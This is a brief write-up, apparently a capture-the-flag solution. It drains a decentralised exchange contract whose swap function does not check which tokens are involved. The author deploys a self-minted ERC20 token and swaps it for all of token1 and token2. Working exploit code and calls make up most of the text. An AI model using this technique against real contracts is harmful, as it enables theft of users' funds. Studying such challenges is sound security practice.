The bug in this contract is that it does not validate that the swap is between same tokens, so here is ou advantage.
Create a contract that creates our token:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MYTOKEN is ERC20 {
    constructor(uint256 initialSupply) ERC20("MYTOKEN", "MT") {
        _mint(msg.sender, initialSupply);
    }
}
```
Now we can swap for 100 of token 1 and same for token 2.
MYTOKEN = (CONTRACT_ADDRESS)
t1 = await contract.token1()
t2 = await contract.token2()

await contract.swap(MYTOKEN, t1, 100)
await contract.swap(MYTOKEN, t2, 200)

We win :)